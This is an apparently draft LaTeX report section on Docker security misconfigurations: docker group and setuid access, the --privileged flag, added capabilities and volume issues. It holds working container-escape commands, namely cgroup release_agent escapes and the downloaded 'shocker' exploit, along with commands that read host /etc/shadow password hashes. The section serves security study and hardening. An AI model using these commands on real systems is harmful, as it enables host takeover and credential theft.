\section{Misconfigurations}
\todo[inline]{\url{https://www.katacoda.com/courses/docker-security/}}
\todo[inline]{Map to CIS Benchmark}
\todo[inline]{Does CIS cover everything?}
\todo[inline]{\href{https://www.nccgroup.trust/uk/our-research/abusing-privileged-and-unprivileged-linux-containers/}{Abusing Privileged and Unprivileged Linux Containers}}
\todo[inline]{\href{https://www.nccgroup.trust/uk/our-research/understanding-and-hardening-linux-containers/}{Understanding and Hardening Linux Containers}}
\todo[inline]{\href{https://0x00sec.org/t/securing-docker-containers/16913}{Securing Docker Containers}}
\todo[inline]{\href{https://www.reddit.com/r/docker/comments/dkgtfv/10_docker_image_security_best_practices/}{10 Docker Image Security Best Practices}}
\todo[inline]{\url{http://training.play-with-docker.com/security-seccomp/}}
\todo[inline]{Usage of third party Docker images}
\todo[inline]{\href{https://forums.grsecurity.net/viewtopic.php?f=7&t=2522}{False Boundaries and Arbitrary Code Execution}}

\subsection{Docker Permissions}
A very common (and most notorious) misconfiguration is giving unprivileged users access to Docker. This is very dangerous because this allows the unprivileged users to access all files as \lstinline{root}. The Docker documentation says\cite{Docker-Daemon-Attack-Surface}: 
\begin{quote}
First of all, only trusted users should be allowed to control your Docker daemon. This is a direct consequence of some powerful Docker features. Specifically, Docker allows you to share a directory between the Docker host and a guest container; and it allows you to do so without limiting the access rights of the container. This means that you can start a container where the /host directory is the / directory on your host; and the container can alter your host filesystem without any restriction.
\end{quote}

In short, because the Docker Daemon runs as root, if an user adds a directory as a volume to a container, that file is accessed as root. There are two common ways for unprivileged users to access Docker. They are either part of the \lstinline{docker} group or the \lstinline{docker} binary has the \lstinline{setuid} bit set.

\subsubsection{\texorpdfstring{\lstinline{docker}}{docker} group}
Every user in the \lstinline{docker} group is allowed to use Docker. This allows simple access management of Docker usage. Sometimes the system administrator of a network does not want to do proper access management and adds every user to the \lstinline{docker} group, because that allows everything to run smoothly. This misconfiguration, however allows every user to access every file on the system.

\hfill

Lets say we want the password hash of user \lstinline{admin} on a system where we do not have \lstinline{sudo} privileges, but we are a member of the \lstinline{docker} group.

\begin{lstlisting}
$ sudo -v
Sorry, user unpriv may not run sudo on host.
$ groups | grep -o docker
docker
$ docker run -it --rm --volume=/:/host ubuntu:latest bash
# grep admin /host/etc/shadow
admin:$6$VOSV5AVQ$jHWxAVAUgl...:18142:0:99999:7:::
\end{lstlisting}

We start by checking our permissions. We do not have \lstinline{permissions}, but we are a member of the \lstinline{docker} group. This allows us to create a container with \lstinline{/} mounted as volume and access any file as root. This includes the file storing password hashes \lstinline{/etc/passwd}.

\subsubsection{\texorpdfstring{\lstinline{setuid}}{setuid} bit}
Another way system administrators might skip proper access management is to set the \lstinline{setuid} bit on the \lstinline{docker} binary.

\hfill

The \lstinline{setuid} bit is a permission bit in Unix, that allows users to run binaries as the owner (or group) of the binary instead of themselves. 
This is very useful in specific cases. For example, users should be able to change their own passwords, but should not be able to read password hashes of other users. That is why the \lstinline{passwd} binary has the \lstinline{setuid} bit set. A user can change their password, because \lstinline{passwd} is run as \lstinline{root} (the owner of \lstinline{passwd}) and, of course, \lstinline{root} is able to read and write the password file. In this case the protection and security comes from the fact that \lstinline{passwd} asks for the user's password itself and only writes to specific entries in the password file.

\hfill

If a system is misconfigured by having the \lstinline{setuid} bit set for the \lstinline{docker} binary, a user will be able to execute Docker as \lstinline{root} (the owner of \lstinline{docker}). Just like before, we can easily recreate this attack.

\begin{lstlisting}
$ sudo -v
Sorry, user unpriv may not run sudo on host.
$ groups | grep -o docker
$ ls -halt /usr/bin/docker
-rwsr-xr-x 1 root root 85M okt 18 17:52 /usr/bin/docker
$ docker run -it --rm --volume=/:/host ubuntu:latest bash
# grep admin /host/etc/shadow
admin:$6$VOSV5AVQ$jHWxAVAUgl...:18142:0:99999:7:::
\end{lstlisting}

We now see that we are not a part of the \lstinline{docker} group, but we can still run \lstinline{docker} because the \lstinline{setuid} bit is set.

\subsection{The -{}-privileged flag}

Docker has a special privileged mode\cite{Docker-in-Docker-blog}. This mode is enabled if a container is created with the \lstinline{--privileged} flag and it enables access to all host devices and kernel capabilities. This is a very powerful mode and enables some very useful features (e.g\ building Docker images inside a Docker container). But it is also very dangerous as those kernel features allow an attacker inside the container to escape and access the host.

\hfill

A simple example of this, is using a feature in \lstinline{cgroups}\cite{CGroup-Docs}. If a \lstinline{cgroup} does not contain any processes anymore, it is released. It is possible to specify a command that should be run in case that happens (called a \lstinline{release_agent}). It is possible to define such a \lstinline{release_agent} in a privileged docker. If the \lstinline{cgroup} is released, the command is run on the host\cite{TrailOfBits-Docker-Escape}.

\hfill

We can look at a proof of concept of this attack developed by security researcher Felix Wilhelm\cite{Felix-Wilhem-Tweet}.
\begin{lstlisting}
$ docker run -it --rm --privileged ubuntu:latest bash
# d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
# mkdir -p $d/w;echo 1 >$d/w/notify_on_release
# t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
# touch /o; echo $t/c >$d/release_agent;printf '#!/bin/sh\nps >'"$t/o" >/c;
# chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
\end{lstlisting}

This proof of concept creates a new \lstinline{cgroup}, sets a \lstinline{release_agent} and releases it. In this case the \lstinline{release_agent} runs \lstinline{ps} and writes the output to the root of the container.


\subsection{Capabilities}
To perform a privileged Linux kernel action, the process needs the relevant \lstinline{capability}. \lstinline{capabilities}\footnote{See the \lstinline{man page} of \lstinline{capbilities}}
 are a Linux feature that allow specific privileged actions (e.g.\ sending raw packets). A process running as \lstinline{uid} 0(\lstinline{root}) has all capabilities.
 Processes in a Docker container are given minimum capabilities, but if needed it is possible to add extra capabilities using the \lstinline{--cap-add} argument. It is also possible to drop unnecessary capabilities using the \lstinline{--cap-drop}. In privileged mode, the container has all capabilities.

\hfill

Giving containers extra capabilities, gives the container permission to perform certain actions. Some of these actions allow Docker escapes.

\subsubsection{\texorpdfstring{\lstinline{SYS_ADMIN}}{SYS_ADMIN}}
The Docker escape by Felix Wilhelm\cite{Felix-Wilhem-Tweet} needs to be run in privileged mode to work, but it can be rewritten to only need the permission to run \lstinline{mount}\cite{TrailOfBits-Docker-Escape}, which is granted by the \lstinline{SYS_ADMIN} capability.

\begin{lstlisting}
$ docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu /bin/bash
# mkdir /tmp/cgrp
# mount -t cgroup -o rdma cgroup /tmp/cgrp
# mkdir /tmp/cgrp/x
# echo 1 > /tmp/cgrp/x/notify_on_release
# host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
# echo "$host_path/cmd" > /tmp/cgrp/release_agent
# echo '#!/bin/sh' > /cmd
# echo "ps aux > $host_path/output" >> /cmd
# chmod a+x /cmd
# sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
# cat /output
\end{lstlisting}

Unlike before, instead of relying on \lstinline{--privilege} to give us write access to a \lstinline{cgroup}, we just need to mount our own. This gives us exactly the same scenario as before. We account use a \lstinline{release_agent} to run code on the host. The only difference being that we have to do some manual work ourselves. 

\subsubsection{\texorpdfstring{\lstinline{CAP_DAC_READ_SEARCH}}{CAP_DAC_READ_SEARCH}}
Before Docker 1.0.0 \lstinline{CAP_DAC_READ_SEARCH} was added to the default capabilities that a containers are given. But this capability allows a process to escape its the container\cite{Docker-Shocker-Seclists}. To demonstrate this attack a proof of concept exploit was released\cite{Docker-Shocker}\cite{Docker-Shocker-Analysis}. This exploit has been released in 2014, but still works on containers with the \lstinline{CAP_DAC_READ_SEARCH} capability.

\hfill

\begin{lstlisting}
$ cd /tmp
$ curl -O http://stealth.openwall.net/xSports/shocker.c
$ sed -i "s/\/.dockerinit/\/tmp\/a.out/" shocker.c
$ cc -Wall -std=c99 -O2 shocker.c -static
$ docker run --rm -it --cap-add="CAP_DAC_READ_SEARCH" -v "/tmp:/tmp" busybox sh
# /tmp/a.out
...
[!] Win! /etc/shadow output follows:
...
admin:$6$VOSV5AVQ$jHWxAVAUgl...:18142:0:99999:7:::
\end{lstlisting}

The exploit needs a file with a file handle on the host system to properly work. Instead of the default \lstinline{/.dockerinit} (which does not exist anymore) we use the exploit file itself \lstinline{/tmp/a.out}. We start a container with the \lstinline{CAP_DAC_READ_SEARCH} capability and run the exploit. It prints the password file of the host (\lstinline{/etc/shadow}).

\subsection{Root user}
\todo[inline]{\href{http://www.projectatomic.io/blog/2016/01/how-to-run-a-more-secure-non-root-user-container/}{How to Run a More Secure Non-Root User Container}}

\subsection{Mounted Docker Socket}
\todo[inline]{\href{https://raesene.github.io/blog/2016/03/06/The-Dangers-Of-Docker.sock/}{The Dangers of Docker.sock}}
\todo[inline]{\href{https://www.exploit-db.com/exploits/42650}{Docker Daemon - Unprotected TCP Socket (Metasploit)}}

\subsection{The -{}-net flag}
\todo[inline]{\href{https://docs.docker.com/engine/reference/run/\#network-settings}{Network settings}}
\todo[inline]{shutdown possible?}

\subsection{Vulnerable volumes}
\todo[inline]{Wrong volumes: / or /proc}
Many of the Docker container escape vulnerabilities exist because a container can access system files directly on the host. In the latest version of Docker none of those paths are accessible anymore, but it is sometimes possible to add those paths as a volume anyway.

\subsection{Readable configuration files}
\todo[inline]{\href{https://github.com/rapid7/metasploit-framework/blob/master/modules/post/multi/gather/docker_creds.rb}{Metasploit Multi Gather Docker Credentials Collection}}

\subsection{REST API}
\todo[inline]{\href{https://github.com/docker/hub-feedback/issues/1809}{zoolu2 botnet}}
